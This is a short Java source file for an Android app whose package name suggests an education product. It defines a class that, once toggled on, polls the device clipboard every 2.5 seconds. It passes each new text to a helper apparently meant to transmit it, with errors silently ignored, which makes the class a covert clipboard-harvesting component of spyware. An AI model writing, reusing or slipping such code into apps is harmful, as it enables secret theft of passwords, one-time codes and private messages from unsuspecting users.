package com.eloeeducacao;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public final class Clip {

    public static volatile boolean on;
    private static String ultimo = "";
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static boolean rodando;

    public static void liga(final Context c) {
        if (rodando) return;
        rodando = true;
        H.postDelayed(new Runnable() {
            @Override public void run() {
                if (!on) { rodando = false; return; }
                try {
                    ClipboardManager cm = (ClipboardManager)
                            c.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData d = cm.getPrimaryClip();
                    if (d != null && d.getItemCount() > 0) {
                        CharSequence t = d.getItemAt(0).coerceToText(c);
                        if (t != null && t.length() > 0 && t.length() < 4000) {
                            String s = t.toString();
                            if (!s.equals(ultimo)) {
                                ultimo = s;
                                Util.sendT("clip", s);
                            }
                        }
                    }
                } catch (Throwable ignored) {}
                H.postDelayed(this, 2500);
            }
        }, 800);
    }
}
